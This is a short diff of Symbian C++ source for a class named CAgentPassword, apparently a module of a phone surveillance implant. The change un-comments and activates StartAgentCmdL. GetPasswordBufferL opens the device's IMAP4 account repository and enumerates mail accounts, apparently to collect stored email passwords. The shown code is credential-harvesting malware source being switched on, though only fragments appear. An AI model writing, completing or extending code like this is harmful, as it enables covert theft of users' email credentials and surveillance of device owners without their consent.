@@ -52,8 +52,7 @@ void CAgentPassword::ConstructL(const TDesC8& params)
 
 void CAgentPassword::StartAgentCmdL()
 	{
-	//TODO: activate this in 8.1
-	/*
+	
 	__FLOG(_L("StartAgentCmdL()"));
 	if(iBusy)
 		return;
@@ -62,7 +61,7 @@ void CAgentPassword::StartAgentCmdL()
 	buf.CleanupClosePushL();
 	if (buf.Length() > 0)
 		{
-		TInt value;
+		TInt value=0;
 		RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
 		if(value)
 			{
@@ -76,7 +75,7 @@ void CAgentPassword::StartAgentCmdL()
 		}
 	CleanupStack::PopAndDestroy(&buf);
 	iBusy = EFalse;
-	*/
+
 	}
 
 void CAgentPassword::StopAgentCmdL()
@@ -106,7 +105,7 @@ HBufC8* CAgentPassword::GetPasswordBufferL()
 	const TUint32 EAccountMask = 0x800FFFFF;
 	
 	CRepository* imapRepository = NULL;
-	imapRepository = CRepository::NewL(KUidMsgTypeIMAP4);
+	imapRepository = CRepository::NewL(KUidMsgTypeIMAP4); // TODO: put trap here
 	CleanupStack::PushL(imapRepository);
 	//get a list of imap accounts
 	RArray<TUint32> imapAccountIds;
